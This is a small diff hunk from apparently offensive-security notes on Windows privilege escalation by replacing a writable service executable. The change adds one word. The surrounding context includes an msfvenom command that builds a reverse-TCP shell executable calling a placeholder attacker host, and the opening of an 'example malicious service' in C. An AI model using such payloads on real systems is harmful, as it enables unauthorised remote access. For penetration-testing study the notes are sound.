@@ -24,6 +24,8 @@ If there is F, W or those permissions are inherited (I) - we can replace the exe
 ```bash
 msfvenom -p windows/x64/shell/reverse_tcp LHOST=$(IP_ADDRESS) LPORT=$(PORT) -f exe -o reverse.exe
 ```
+Or
+
 Example malicious service to use:
 ```c
 #include <stdlib.h>
